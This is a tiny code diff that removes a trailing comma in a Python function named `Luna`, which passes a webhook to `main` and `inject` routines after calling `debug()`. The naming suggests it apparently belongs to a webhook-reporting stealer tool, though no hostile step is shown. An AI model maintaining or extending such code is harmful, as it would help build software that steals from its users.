@@ -57,7 +57,7 @@ def main(webhook: str):
 def Luna(webhook: str):
     debug()
 
-    procs = [main, inject,]
+    procs = [main, inject]
 
     for proc in procs:
         proc(webhook)
